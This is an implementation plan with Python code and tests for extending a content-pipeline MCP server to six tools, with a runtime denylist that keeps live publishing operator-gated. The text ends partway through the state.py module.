# factory-mcp 6-Verb Tool Surface Implementation Plan

> **For agentic workers:** This plan is executed task-by-task by GPT-5.5 dispatched via the Hermes CLI (`hermes -z "<prompt>" -m gpt-5.5 --cli --yolo`), one task per dispatch, orchestrated by an Opus 4.8 agent, from a fresh context with no memory of prior conversation. REQUIRED SUB-SKILL for the orchestrator: superpowers:subagent-driven-development (fresh subagent per task, review between tasks). Read the entire task you are assigned before starting. Do not skip verification steps. If a verification command fails, stop and report the exact output — do not guess a fix that isn't in this plan. Steps use checkbox (`- [ ]`) syntax for tracking.

**Spec (source of truth):** `/home/jarvis/.openclaw/workspace/jarvis-project/travelplaninfo-prototype/docs/superpowers/specs/2026-07-07-factory-mcp-design.md`

**Goal:** Extend the existing `factory-mcp` stdio server from 3 read-only tools to a typed 6-verb surface (`factory_status/draft/images/assemble/review/publish`) that drives the content pipeline via subprocess — with `factory_publish` structurally unable to publish live.

**Architecture:** The MCP process keeps its minimal `.venv` (only `mcp` + `pytest`) and shells every pipeline stage out to `/usr/bin/python3 command-post/<script>.py`, mirroring the proven FastAPI wrap (`command-post/routers/content_pipeline.py` `_run_cp_job`, ~line 342). A sync `runner.run_script()` helper captures output AND is the runtime publish-gate chokepoint (frozen forbidden-flag denylist, raises before any subprocess); sync verb handlers in `verbs.py` map typed inputs to exact argv and build a uniform result envelope; `server.py` bridges them onto the event loop with `anyio.to_thread.run_sync`. `state.py` imports `command-post/db.py` (verified stdlib-only deps) read-only, so `factory_status` and every envelope's `resulting_state` come from the SQLite source of truth, not raw JSON — the spec §3.4 carve-out.

**Tech Stack:** Python 3.12 (`factory-mcp/.venv`), `mcp` 1.27.x low-level `Server` API (match the scaffold — NOT FastMCP), `pytest` (dev-only), stdlib `subprocess`/`sqlite3`. Pipeline subprocesses always run on system `/usr/bin/python3`.

## Global Constraints

- **Repo & branch:** all work happens in `/home/jarvis/.openclaw/workspace/jarvis-project` (a git repo, default branch `main`) on branch `feat/factory-mcp-verbs` (created in Task 1 Step 0). Do **NOT** use a git worktree: the scaffold's `.venv` and its editable install are untracked and path-bound to `factory-mcp/` — a worktree would arrive without them. All new/modified files live under `factory-mcp/` — never touch `command-post/**` or `state/**` by hand (Task 8 Step 6's scripted throwaway cleanup is the one sanctioned exception).
- **Heartbeat auto-committer:** a background daemon periodically auto-commits `state/` + `content-pipeline/` changes to whatever branch is checked out. `git add` ONLY the explicit paths named in each task's commit step (never `git add -A`/`.`). If an interleaved `Auto-commit ...` appears on the branch, leave it alone; never rebase.
- **Test command:** `cd /home/jarvis/.openclaw/workspace/jarvis-project/factory-mcp && .venv/bin/python -m pytest` (pyproject sets `-q` and `testpaths=["tests"]`). NEVER bare `pytest`/`python3 -m pytest` — only the `.venv` interpreter has the package + pytest. Run the FULL suite at the end of every task, not just the new file.
- **Two interpreters, never mixed:** the MCP itself runs on `factory-mcp/.venv/bin/python` (has only `mcp` + deps + `pytest`); every pipeline script is exec'd with the constant `PIPELINE_PYTHON = "/usr/bin/python3"` (has the pipeline deps). The absolute interpreter path is load-bearing: inside the `.venv`, a bare `python3` resolves to the venv interpreter, which lacks pipeline deps. Do not `pip install` any pipeline dependency into the `.venv`.
- **Tool wire names are snake_case:** `factory_status`, `factory_draft`, `factory_images`, `factory_assemble`, `factory_review`, `factory_publish` — MCP/Anthropic tool names must match `^[a-zA-Z0-9_-]{1,64}$`, so dots are invalid on the wire. The spec (rev 2026-07-07) uses these real handler names too; any dotted `factory.draft` form in older docs is a stale alias.
- **Result envelope (frozen contract)** returned by every action verb (draft/images/assemble/review/publish):

  ```json
  {
    "ok": true,
    "verb": "draft",
    "slug": "<slug>",
    "exit_code": 0,
    "timed_out": false,
    "duration_s": 12.3,
    "cmd": ["/usr/bin/python3", "<abs path to script>", "--slug", "<slug>"],
    "stdout_tail": "<last 40 lines, max 4000 chars>",
    "stderr_tail": "<last 40 lines, max 4000 chars>",
    "resulting_state": {"article": {"...articles row..."}, "queue_stage": "in_progress"}
  }
  ```

  `ok` is exactly `exit_code == 0 and not timed_out`. `exit_code` is `null` on timeout/launch failure. `resulting_state.article` is `db.get_article(slug)` re-read AFTER the run (may be `null`); `queue_stage` is the bucket containing the slug in `state/queue.json` (may be `null`; a corrupt queue adds a `queue_error` string instead of hiding it). `factory_review` adds `review_passed`; `factory_publish` adds `publisher` and `operator_command` — a plainly **NON-executable** next-step instruction, never a runnable live-publish command (see the gate below). `factory_status` has its own read-only shape (Task 2).
- **THE PUBLISH GATE (spec §3.3, absolute):** no code path may ever place `--approve`, `--ack-jose-approved`, `--force`, `--rebuild`, `--all`, `--batch`, `--audit-all`, `--audit-published`, or `--fix` into a subprocess argv. `factory_publish` always passes `--dry-run`. Requesting `dry_run: false` returns a structured refusal (no subprocess spawned). **Enforced in three layers:** (1) structural — typed inputs mapped into a literal argv list, `shell=False`; (2) **runtime** — `runner.run_script()` holds `FORBIDDEN_FLAGS`, a frozen denylist of the flags above, and raises `ValueError` before spawning if any argv entry (or its `=`-prefix) matches — every verb, including future ones, passes through this single chokepoint; (3) tests (Task 7 sweep, Task 1 runner test) + Task 9 greps. **Response-side rule (equally absolute):** no string the tool COMPOSES — `operator_command`, refusal `message`, tool descriptions — may contain `--approve` or `--ack-jose-approved`. The tool never composes a paste-and-run live-publish command; the approval flags are typed by the human operator only, after Jose's explicit go-ahead. (Sole, bounded exception: `stdout_tail`/`stderr_tail` are VERBATIM passthrough of the wrapped script's own output — e.g. tpi_publisher's dry-run hint "Run with --approve to publish", verified at `tpi_publisher.py:310` — and are never sanitized, per errors-surface-never-swallowed; the hook-passing `--ack-jose-approved` token appears in NO script output and must appear in NO response field, passthrough included.) Live publishing stays exclusively operator-gated (CLI/dashboard with the ack flag).
- **Flag-injection guard:** every string input is rejected with `ValueError` if it begins with `-` (otherwise a caller could smuggle `--approve` through `slug`). Additionally, `slug` is charset-validated on EVERY verb — `re.fullmatch(r"[a-z0-9][a-z0-9-]{0,80}", slug)`, reject otherwise — because slug is also a filesystem path component and is interpolated into returned text; and every value interpolated into `operator_command` is `shlex.quote`d (belt-and-braces even though that string is non-executable).
- **Unknown argument keys are rejected** (`_reject_unknown_keys` at the top of every verb + `"additionalProperties": False` in every input schema): a typo'd key — e.g. `schdule` for `schedule`, or `approve` — raises `ValueError` listing the unknown and allowed keys. It must never be silently swallowed into an `ok: true` result that quietly dropped the caller's intent. The in-handler check is the load-bearing layer — do NOT rely on the mcp SDK validating `additionalProperties` (whether 1.27's `call_tool` input validation enforces it changes error shape, not this requirement).
- **Errors surface, never swallowed:** input-validation problems `raise ValueError` with an actionable message (the MCP SDK converts raised handler exceptions into `isError` tool results); a failing subprocess is NOT an exception — it returns the envelope with `ok: false` and the stderr tail visible.
- **Monkeypatch seam (mandatory style):** `verbs.py` imports collaborators as modules (`from factory_mcp import runner, state`) and calls them as attributes (`runner.run_script(...)`, `state.read_resulting_state(...)`). Never `from factory_mcp.runner import run_script` inside `verbs.py` — that would break the test fixtures.
- **Match the scaffold's style:** low-level `mcp.server.Server` + `@server.list_tools()` / `@server.call_tool()`, `types.Tool` with raw JSON-schema dicts, handlers returning `list[types.TextContent]` with JSON text, `# ── section ──` comment bars, 4-space indent. Do not rewrite the 3 existing tools; they must keep working unchanged.
- TDD per task: write the failing test, watch it fail, implement, watch it pass, commit. One commit per task, from the repo root, explicit paths only.

## File Structure

```
factory-mcp/
  pyproject.toml                 modify   Task 1 — dev extra (pytest) + pytest config
  src/factory_mcp/
    paths.py                     create   Task 1 — canonical paths + PIPELINE_PYTHON
    runner.py                    create   Task 1 — run_script() subprocess wrapper + tail()
    state.py                     create   Task 2 — read-only db.py bridge + resulting_state
    verbs.py                     create   Task 2 — helpers + status; Tasks 3-7 append one verb each
    server.py                    modify   Task 1 (paths import), Task 2 (dispatch), Tasks 2-7 (+1 Tool each)
  tests/
    conftest.py                  create   Task 1 — fake_runner + canned_state fixtures
    test_runner.py               create   Task 1
    test_state.py, test_status.py         create   Task 2
    test_draft.py                create   Task 3
    test_images.py               create   Task 4
    test_assemble.py             create   Task 5
    test_review.py               create   Task 6
    test_publish.py              create   Task 7
  scripts/
    smoke_client.py              create   Task 8 — MCP-client integration smoke (not pytest-collected)
  README.md                      modify   Task 8 — tools table + registration snippet
```

---

### Task 1: Paths module + `run_script()` subprocess helper + test harness

**Files:**
- Create: `factory-mcp/src/factory_mcp/paths.py`
- Create: `factory-mcp/src/factory_mcp/runner.py`
- Create: `factory-mcp/tests/conftest.py`
- Create: `factory-mcp/tests/test_runner.py`
- Modify: `factory-mcp/pyproject.toml`
- Modify: `factory-mcp/src/factory_mcp/server.py` (lines 24-30, the `# ── Paths ──` block only)

**Interfaces:**
- Produces: `paths.BASE_DIR: Path`, `paths.STATE_DIR: Path`, `paths.EVENTS_JSONL: Path`, `paths.QUEUE_JSON: Path`, `paths.PIPELINE_DIR: Path`, `paths.COMMAND_POST_DIR: Path`, `paths.PIPELINE_PYTHON: str`.
- Produces: `runner.run_script(script: str, args: list[str], timeout_s: int) -> dict` returning `{"cmd": list[str], "exit_code": int | None, "timed_out": bool, "duration_s": float, "stdout": str, "stderr": str}` — never raises for subprocess outcomes; raises `ValueError` ONLY when a forbidden flag appears in `args` (the runtime publish gate), before any process is spawned. Children run in their own process group (`start_new_session=True`); a timeout SIGKILLs the whole group so grandchildren (e.g. sonnet_writer's `claude` CLI) cannot outlive a `timed_out:true` envelope.
- Produces: `runner.FORBIDDEN_FLAGS: frozenset[str]` — the runtime denylist backing the publish gate (Global Constraints).
- Produces: `runner.tail(text: str, max_lines: int = 40, max_chars: int = 4000) -> str`.
- Produces (test harness): fixtures `fake_runner` (records calls in `fake_runner.calls`; canned result mutable via `fake_runner.result`) and `canned_state` (stubs `state.read_resulting_state`) in `tests/conftest.py` — consumed by Tasks 3-7 — plus conftest's module-level **DB isolation** (a temp copy of `command-post/db.py` + `lib/` pre-imported as `db`, so no test run ever executes `init_db()` — which includes an `ALTER TABLE` + backfill migration — against production `state/jarvis.db`).

- [ ] **Step 0: Create the branch**

```bash
cd /home/jarvis/.openclaw/workspace/jarvis-project
git checkout main && git checkout -b feat/factory-mcp-verbs
```

Run: `git branch --show-current`
Expected: `feat/factory-mcp-verbs`

- [ ] **Step 1: Add pytest to the isolated venv**

Edit `factory-mcp/pyproject.toml` — two changes only. First, pin the runtime dep to the API generation this plan is written against (installed 1.27.1; `ClientSession(read_timeout_seconds=...)`, low-level `Server`, `anyio` availability): in `[project]` change `"mcp>=1.0"` to `"mcp>=1.27,<2"`. Second, append after the `[project.scripts]` table (keep everything else byte-identical):

```toml
[project.optional-dependencies]
dev = [
    "pytest>=8",
]

[tool.pytest.ini_options]
testpaths = ["tests"]
addopts = "-q"
```

```bash
cd /home/jarvis/.openclaw/workspace/jarvis-project/factory-mcp
.venv/bin/pip install -e ".[dev]"
.venv/bin/python -m pytest --version
```

Expected: install succeeds; `pytest 8.x` printed. (The venv intentionally stays minimal; pytest is the sole addition.)

- [ ] **Step 2: Write the failing runner test**

Create `factory-mcp/tests/conftest.py`:

```python
"""Shared fixtures + session-wide DB isolation.

DB ISOLATION (runs at collection, BEFORE any test module imports factory_mcp.state):
importing command-post/db.py executes init_db() immediately — not just idempotent
CREATE TABLEs but also the cost_daily provider migration (ALTER TABLE + UPDATE
backfill). Unit tests must NEVER run that against production state/jarvis.db.
db.DB_PATH derives from db.py's OWN file location (Path(__file__).parent.parent/
"state"), so we copy db.py + lib/ into a temp tree and import `db` from there
first; state.py's later `import db` (Task 2) reuses this cached sys.modules entry,
so its sys.path.insert of the real command-post dir cannot re-import the real one.

Fixture-body imports are deliberate: conftest must be importable in Task 1 before
factory_mcp.state/verbs exist.
"""
import shutil
import sys
import tempfile
from pathlib import Path

import pytest

from factory_mcp.paths import COMMAND_POST_DIR

_TMP_ROOT = Path(tempfile.mkdtemp(prefix="factory-mcp-tests-"))
_TMP_CP = _TMP_ROOT / "command-post"
_TMP_CP.mkdir(parents=True)
shutil.copy2(COMMAND_POST_DIR / "db.py", _TMP_CP / "db.py")
shutil.copytree(COMMAND_POST_DIR / "lib", _TMP_CP / "lib")
sys.path.insert(0, str(_TMP_CP))
import db  # noqa: E402  — cached as sys.modules["db"]; init_db() runs against <tmp>/state/

assert Path(db.DB_PATH).is_relative_to(_TMP_ROOT), (
    f"test DB isolation FAILED — db.DB_PATH={db.DB_PATH} is outside the temp tree; "
    "refusing to run tests against production state/jarvis.db"
)


@pytest.fixture
def fake_runner(monkeypatch):
    """Replace runner.run_script with a recorder returning a mutable canned result.

    fake_runner.calls  -> list of {"script", "args", "timeout_s"} per invocation.
    fake_runner.result -> mutate BEFORE calling a verb to simulate failure/timeout,
                          e.g. fake_runner.result.update(exit_code=1, stderr="boom").
    """
    from factory_mcp import runner

    def fake(script, args, timeout_s):
        fake.calls.append({"script": script, "args": list(args), "timeout_s": timeout_s})
        return {
            "cmd": [runner.PIPELINE_PYTHON, f"command-post/{script}", *args],
            **fake.result,
        }

    fake.calls = []
    fake.result = {"exit_code": 0, "timed_out": False, "duration_s": 0.01,
                   "stdout": "ok\n", "stderr": ""}
    monkeypatch.setattr(runner, "run_script", fake)
    return fake


@pytest.fixture
def canned_state(monkeypatch):
    """Stub state.read_resulting_state so verb tests never touch the real DB/queue."""
    from factory_mcp import state
    payload = {"article": {"slug": "canned", "stage": "in_progress"},
               "queue_stage": "in_progress"}
    monkeypatch.setattr(state, "read_resulting_state", lambda slug: payload)
    return payload
```

Create `factory-mcp/tests/test_runner.py`:

```python
import subprocess

import pytest

from factory_mcp import runner


class _FakeProc:
    """Minimal subprocess.Popen stand-in (records communicate() calls)."""

    def __init__(self, returncode=0, stdout="hello\n", stderr="", hang=False):
        self.pid = 4242
        self.returncode = returncode
        self._stdout, self._stderr = stdout, stderr
        self._hang = hang
        self.communicate_calls = []

    def communicate(self, timeout=None):
        self.communicate_calls.append(timeout)
        if self._hang and len(self.communicate_calls) == 1:
            raise subprocess.TimeoutExpired(["cmd"], timeout)
        return self._stdout, self._stderr


def test_run_script_raises_on_forbidden_flag_before_any_spawn(monkeypatch):
    """Runtime publish gate: the denylist fires at the chokepoint, pre-spawn."""
    def never(*args, **kwargs):
        raise AssertionError("subprocess.Popen must not be reached for forbidden argv")

    monkeypatch.setattr(runner.subprocess, "Popen", never)
    for bad in ("--approve", "--ack-jose-approved", "--force", "--rebuild", "--all",
                "--batch", "--audit-all", "--audit-published", "--fix",
                "--approve=yes"):
        with pytest.raises(ValueError, match="forbidden flag"):
            runner.run_script("wp_publisher.py", ["--slug", "x", bad], timeout_s=5)


def test_tail_truncates_lines_and_chars():
    text = "\n".join(f"line{i}" for i in range(100))
    out = runner.tail(text, max_lines=5, max_chars=1000)
    assert out.splitlines() == ["line95", "line96", "line97", "line98", "line99"]
    assert runner.tail("x" * 10_000, max_lines=1, max_chars=100) == "x" * 100
    assert runner.tail("") == ""


def test_run_script_success_maps_command_and_captures_output(monkeypatch):
    seen = {}
    proc = _FakeProc()

    def fake_popen(cmd, **kwargs):
        seen["cmd"], seen["kwargs"] = cmd, kwargs
        return proc

    monkeypatch.setattr(runner.subprocess, "Popen", fake_popen)
    result = runner.run_script("content_assembler.py", ["--slug", "x"], timeout_s=300)
    assert result["exit_code"] == 0 and result["timed_out"] is False
    assert result["stdout"] == "hello\n" and result["stderr"] == ""
    assert result["cmd"] == seen["cmd"]
    assert seen["cmd"][0] == "/usr/bin/python3"
    assert seen["cmd"][1].endswith("command-post/content_assembler.py")
    assert seen["cmd"][2:] == ["--slug", "x"]
    assert seen["kwargs"]["start_new_session"] is True  # M1: own process group
    assert seen["kwargs"]["text"] is True
    assert proc.communicate_calls == [300]              # deadline rides on communicate()


def test_run_script_failure_surfaces_stderr(monkeypatch):
    monkeypatch.setattr(
        runner.subprocess, "Popen",
        lambda cmd, **kw: _FakeProc(returncode=1, stdout="", stderr="boom: no draft"))
    result = runner.run_script("content_assembler.py", ["--slug", "x"], timeout_s=300)
    assert result["exit_code"] == 1
    assert "boom: no draft" in result["stderr"]


def test_run_script_timeout_kills_process_group_and_returns_partial(monkeypatch):
    """M1: on deadline the WHOLE process group dies — sonnet_writer's `claude`
    CLI grandchild must not outlive an envelope that reported timed_out:true."""
    proc = _FakeProc(stdout="partial", stderr="", hang=True)
    monkeypatch.setattr(runner.subprocess, "Popen", lambda cmd, **kw: proc)
    killed = {}
    monkeypatch.setattr(runner.os, "killpg",
                        lambda pgid, sig: killed.update(pgid=pgid, sig=sig))
    result = runner.run_script("image_pipeline.py", ["--slug", "x"], timeout_s=1)
    assert result["timed_out"] is True and result["exit_code"] is None
    assert result["stdout"] == "partial" and result["stderr"] == ""
    assert killed == {"pgid": 4242, "sig": runner.signal.SIGKILL}
    assert proc.communicate_calls == [1, None]  # deadline call + post-kill reap


def test_run_script_real_subprocess_missing_script():
    # Real subprocess round-trip with zero pipeline deps:
    # /usr/bin/python3 exits 2 when the script file does not exist.
    result = runner.run_script("definitely_missing_script_xyz.py", [], timeout_s=30)
    assert result["timed_out"] is False
    assert result["exit_code"] == 2
    assert "No such file" in result["stderr"] or "can't open file" in result["stderr"]
```

- [ ] **Step 3: Run tests to verify they fail**

Run: `cd /home/jarvis/.openclaw/workspace/jarvis-project/factory-mcp && .venv/bin/python -m pytest`
Expected: collection error — a `ModuleNotFoundError` import failure (conftest hits `factory_mcp.paths` first; `factory_mcp.runner` is equally acceptable). Either is the correct red state.

- [ ] **Step 4: Implement `paths.py` and `runner.py`**

Create `factory-mcp/src/factory_mcp/paths.py`:

```python
"""Canonical paths + interpreter constants shared by server, runner, and state."""
from __future__ import annotations

import os
from pathlib import Path

BASE_DIR         = Path(os.getenv("JARVIS_PROJECT_DIR",
                                  "/home/jarvis/.openclaw/workspace/jarvis-project"))
STATE_DIR        = BASE_DIR / "state"
EVENTS_JSONL     = STATE_DIR / "article-events.jsonl"
QUEUE_JSON       = STATE_DIR / "queue.json"
PIPELINE_DIR     = BASE_DIR / "content-pipeline"
COMMAND_POST_DIR = BASE_DIR / "command-post"

# System interpreter that has the pipeline dependencies. The MCP's own .venv has
# only `mcp` — pipeline scripts are NEVER imported into this process (spec §3.1).
# Absolute path is load-bearing: a bare "python3" inside the venv resolves to the
# venv interpreter, which lacks the pipeline deps.
PIPELINE_PYTHON  = "/usr/bin/python3"
```

Create `factory-mcp/src/factory_mcp/runner.py`:

```python
"""Subprocess wrapper for command-post pipeline scripts.

Mirrors the proven FastAPI wrap in command-post/routers/content_pipeline.py
(_run_cp_job): run `/usr/bin/python3 command-post/<script> <args>` from the
project root, capture stdout+stderr, enforce a deadline, surface everything.
run_script never raises for subprocess outcomes — every failure mode is a
structured return. The ONE exception is the runtime publish gate below: a
forbidden flag in argv raises ValueError before any process is spawned.
"""
from __future__ import annotations

import os
import signal
import subprocess
import time

from factory_mcp.paths import BASE_DIR, COMMAND_POST_DIR, PIPELINE_PYTHON

TAIL_LINES = 40
TAIL_CHARS = 4000

# ── Runtime publish gate (spec §3.3 / plan Global Constraints) ─────────────────
# run_script() is the single chokepoint every verb — including future ones —
# passes through. This frozen denylist turns the "no code path may ever emit
# these flags" constraint into a mechanism, not just tests + grep. The Bash
# PreToolUse hook does NOT see MCP calls, so this layer is load-bearing.
FORBIDDEN_FLAGS = frozenset({
    "--approve", "--ack-jose-approved", "--force", "--rebuild", "--all",
    "--batch", "--audit-all", "--audit-published", "--fix",
})


def _reject_forbidden(args: list[str]) -> None:
    for arg in args:
        if arg.split("=", 1)[0] in FORBIDDEN_FLAGS:
            raise ValueError(
                f"forbidden flag {arg!r} in argv — factory-mcp is structurally "
                "unable to pass approval/batch/override flags to pipeline "
                "scripts (runtime publish gate)."
            )


def tail(text: str, max_lines: int = TAIL_LINES, max_chars: int = TAIL_CHARS) -> str:
    """Last `max_lines` lines of `text`, capped at `max_chars` characters."""
    if not text:
        return ""
    clipped = "\n".join(text.splitlines()[-max_lines:])
    return clipped[-max_chars:]


def _as_text(raw) -> str:
    """TimeoutExpired may carry bytes or None for captured output — normalize."""
    if raw is None:
        return ""
    if isinstance(raw, bytes):
        return raw.decode("utf-8", errors="replace")
    return raw


def run_script(script: str, args: list[str], timeout_s: int) -> dict:
    """Run one pipeline script synchronously; return a structured result.

    Never raises for subprocess outcomes. Raises ValueError ONLY when argv
    contains a FORBIDDEN_FLAGS entry (runtime publish gate) — before spawning.
    Returns {"cmd", "exit_code", "timed_out", "duration_s", "stdout", "stderr"}.
    exit_code is None when the process was killed on timeout or failed to launch.

    The child runs in its OWN process group (start_new_session=True) and a
    timeout kills the whole group: sonnet_writer spawns the `claude` CLI as a
    grandchild, which must not keep running (consuming the Max session, writing
    files/DB rows) after the envelope reported timed_out — that skews later
    resulting_state reads and invites duplicate-draft retries.
    """
    _reject_forbidden(args)
    cmd = [PIPELINE_PYTHON, str(COMMAND_POST_DIR / script), *args]
    started = time.monotonic()

    def _result(exit_code, timed_out, stdout, stderr):
        return {
            "cmd": cmd,
            "exit_code": exit_code,
            "timed_out": timed_out,
            "duration_s": round(time.monotonic() - started, 2),
            "stdout": _as_text(stdout),
            "stderr": _as_text(stderr),
        }

    try:
        proc = subprocess.Popen(
            cmd, cwd=str(BASE_DIR), stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True, start_new_session=True,
        )
    except OSError as exc:  # interpreter missing, permissions — surface, don't swallow
        return _result(None, False, "", f"failed to launch subprocess: {exc}")

    try:
        stdout, stderr = proc.communicate(timeout=timeout_s)
        return _result(proc.returncode, False, stdout or "", stderr or "")
    except subprocess.TimeoutExpired:
        try:
            os.killpg(proc.pid, signal.SIGKILL)  # pgid == pid under start_new_session
        except ProcessLookupError:
            pass
        stdout, stderr = proc.communicate()  # reap + collect whatever was flushed
        return _result(None, True, stdout, stderr)
```

- [ ] **Step 5: Switch `server.py` to the shared paths (behavior-identical refactor)**

In `factory-mcp/src/factory_mcp/server.py`, replace this block:

```python
# ── Paths ─────────────────────────────────────────────────────────────────────
BASE_DIR       = Path(os.getenv("JARVIS_PROJECT_DIR",
                                "/home/jarvis/.openclaw/workspace/jarvis-project"))
STATE_DIR      = BASE_DIR / "state"
EVENTS_JSONL   = STATE_DIR / "article-events.jsonl"
QUEUE_JSON     = STATE_DIR / "queue.json"
PIPELINE_DIR   = BASE_DIR / "content-pipeline"
```

with:

```python
# ── Paths ─────────────────────────────────────────────────────────────────────
from factory_mcp.paths import EVENTS_JSONL, QUEUE_JSON
```

Then delete the now-unused `import os` and `from pathlib import Path` lines at the top of `server.py` (`import json` and the typing/mcp imports stay).

- [ ] **Step 6: Run tests to verify they pass**

Run: `cd /home/jarvis/.openclaw/workspace/jarvis-project/factory-mcp && .venv/bin/python -m pytest && .venv/bin/python -c "import factory_mcp.server; print('server imports OK')"`
Expected: `6 passed` and `server imports OK`.

- [ ] **Step 7: Commit**

```bash
cd /home/jarvis/.openclaw/workspace/jarvis-project
git add factory-mcp/pyproject.toml factory-mcp/src/factory_mcp/paths.py \
        factory-mcp/src/factory_mcp/runner.py factory-mcp/src/factory_mcp/server.py \
        factory-mcp/tests/conftest.py factory-mcp/tests/test_runner.py
git commit -m "feat(factory-mcp): subprocess run_script helper + shared paths + test harness"
```

---

### Task 2: `factory_status` — DB-backed read tool + verb dispatch scaffolding

**Files:**
- Create: `factory-mcp/src/factory_mcp/state.py`
- Create: `factory-mcp/src/factory_mcp/verbs.py`
- Create: `factory-mcp/tests/test_state.py`
- Create: `factory-mcp/tests/test_status.py`
- Modify: `factory-mcp/src/factory_mcp/server.py`

**Interfaces:**
- Consumes: `paths.COMMAND_POST_DIR`, `paths.QUEUE_JSON` (Task 1); `runner` module (Task 1).
- Produces: `state.get_article(slug: str) -> dict | None`, `state.get_articles(stage: str | None = None, site: str | None = None) -> list[dict]`, `state.read_resulting_state(slug: str) -> dict` (`{"article": dict|None, "queue_stage": str|None}`, plus `"queue_error": str` when queue.json is unreadable). The imported command-post module is exposed as `state._db` (tests repoint `state._db.DB_PATH`).
- Produces: `verbs.status(arguments: dict) -> dict`; validation helpers `verbs._required_str(arguments, key) -> str`, `verbs._optional_str(arguments, key) -> str | None`, `verbs._no_dash(value, key) -> str`, `verbs._valid_slug(value) -> str` (charset regex), `verbs._slug(arguments) -> str` (required + charset-validated — used by EVERY action verb), `verbs._reject_unknown_keys(arguments, allowed) -> None`; envelope builder `verbs._envelope(verb: str, slug: str, run: dict) -> dict`; timeout constants `DRAFT_TIMEOUT_S=2400`, `IMAGES_TIMEOUT_S=2400`, `ASSEMBLE_TIMEOUT_S=300`, `REVIEW_TIMEOUT_S=300`, `PUBLISH_TIMEOUT_S=900`. Tasks 3-7 append their verb functions to this module and their entries to `server._FACTORY_VERBS`.
- Produces: `server._FACTORY_VERBS: dict[str, callable]` dispatch map + the `anyio.to_thread` bridge in `call_tool`.

- [ ] **Step 1: Write the failing tests**

Create `factory-mcp/tests/test_state.py`:

```python
import json

from factory_mcp import state

_TS = "2026-07-07T00:00:00Z"


def _make_db(tmp_path, monkeypatch):
    # conftest already isolated the import-time init_db() into a session temp
    # tree; this narrows further to a per-test DB.
    monkeypatch.setattr(state._db, "DB_PATH", tmp_path / "test.db")
    state._db.init_db()


def test_read_resulting_state_roundtrip(tmp_path, monkeypatch):
    _make_db(tmp_path, monkeypatch)
    conn = state._db.get_db()
    conn.execute(
        "INSERT INTO articles (slug, site, stage, title, created_at, updated_at) "
        "VALUES (?, ?, ?, ?, ?, ?)",
        ("unit-slug", "travelplaninfo", "in_progress", "Unit", _TS, _TS),
    )
    conn.commit()
    conn.close()
    qpath = tmp_path / "queue.json"
    qpath.write_text(json.dumps({"in_progress": [{"slug": "unit-slug"}], "approved": []}))
    monkeypatch.setattr(state, "QUEUE_JSON", qpath)

    rs = state.read_resulting_state("unit-slug")
    assert rs["article"]["site"] == "travelplaninfo"
    assert rs["article"]["stage"] == "in_progress"
    assert rs["queue_stage"] == "in_progress"
    assert "queue_error" not in rs


def test_read_resulting_state_missing_slug(tmp_path, monkeypatch):
    _make_db(tmp_path, monkeypatch)
    monkeypatch.setattr(state, "QUEUE_JSON", tmp_path / "absent-queue.json")
    rs = state.read_resulting_state("nope")
    assert rs == {"article": None, "queue_stage": None}


def test_read_resulting_state_surfaces_corrupt_queue(tmp_path, monkeypatch):
    _make_db(tmp_path, monkeypatch)
    qpath = tmp_path / "queue.json"
    qpath.write_text("{not json")
    monkeypatch.setattr(state, "QUEUE_JSON", qpath)
    rs = state.read_resulting_state("x")
    assert rs["article"] is None and rs["queue_stage"] is None
    assert "unreadable" in rs["queue_error"]
```

Create `factory-mcp/tests/test_status.py`:

```python
import pytest

from factory_mcp import state, verbs


def test_status_by_slug_returns_single_row(monkeypatch):
    row = {"slug": "abc", "site": "travelsfy.com", "stage": "approved"}
    monkeypatch.setattr(state, "get_article", lambda slug: row if slug == "abc" else None)
    out = verbs.status({"slug": "abc"})
    assert out["ok"] is True and out["verb"] == "status"
    assert out["total"] == 1 and out["returned"] == 1
    assert out["articles"] == [row]
    assert "hint" not in out


def test_status_list_applies_filters_and_limit(monkeypatch):
    rows = [{"slug": f"s{i}", "stage": "approved", "site": "123cts"} for i in range(30)]
    seen = {}

    def fake_get_articles(stage=None, site=None):
        seen.update(stage=stage, site=site)
        return rows

    monkeypatch.setattr(state, "get_articles", fake_get_articles)
    out = verbs.status({"stage": "approved", "site": "123cts", "limit": 10})
    assert seen == {"stage": "approved", "site": "123cts"}
    assert out["total"] == 30 and out["returned"] == 10
    assert out["filters"] == {"stage": "approved", "site": "123cts"}
    assert len(out["articles"]) == 10


def test_status_missing_slug_adds_hint(monkeypatch):
    monkeypatch.setattr(state, "get_article", lambda slug: None)
    out = verbs.status({"slug": "ghost"})
    assert out["total"] == 0 and out["articles"] == []
    assert "not found" in out["hint"]


def test_status_rejects_unknown_stage():
    with pytest.raises(ValueError, match="stage"):
        verbs.status({"stage": "totally-bogus"})


def test_status_rejects_bad_limit():
    with pytest.raises(ValueError, match="limit"):
        verbs.status({"limit": 0})
    with pytest.raises(ValueError, match="limit"):
        verbs.status({"limit": "20"})


def test_status_rejects_unknown_keys():
    with pytest.raises(ValueError, match="staeg"):
        verbs.status({"staeg": "approved"})
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /home/jarvis/.openclaw/workspace/jarvis-project/factory-mcp && .venv/bin/python -m pytest`
Expected: collection error — `ModuleNotFoundError: No module named 'factory_mcp.state'`.

- [ ] **Step 3: Implement `state.py` and `verbs.py`**

Create `factory-mcp/src/factory_mcp/state.py`:

```python
"""Read-only access to the pipeline's SQLite source of truth (state/jarvis.db).

Imports command-post/db.py directly — its import chain (sqlite3 + lib.common,
which is stdlib-only: fcntl/json/os) needs nothing beyond the standard library,
so the MCP's minimal venv can load it. This is the spec §3.4 carve-out: "the MCP
never writes state files directly (except read-only db for status)". Importing
db runs init_db() at import time — NOT just idempotent CREATE TABLEs + mkdir:
it also executes the cost_daily provider migration (ALTER TABLE + UPDATE
backfill, db.py:210-231). Idempotent + WAL + 30s busy-timeout makes this an
accepted write-shaped side effect at every server start on this box; tests
isolate it via conftest's temp-copy import (never production jarvis.db).

All pipeline mutation happens inside the wrapped scripts, which inherit
atomic_modify_json's locking.
"""
from __future__ import annotations

import json
import sys

from factory_mcp.paths import COMMAND_POST_DIR, QUEUE_JSON

sys.path.insert(0, str(COMMAND_POST_DIR))
import db as _db  # noqa: E402  — command-post module (stdlib-only deps, verified)


def get_article(slug: str) -> dict | None:
    """Single article row by slug, or None."""
    return _db.get_article(slug)


def get_articles(stage: str | None = None, site: str | None = None) -> list[dict]:
    """Article rows, newest first, optionally filtered by stage/site."""
    return _db.get_articles(stage=stage, site=site)


def read_resulting_state(slug: str) -> dict:
    """Post-run structured truth for a slug: DB row + queue.json bucket.
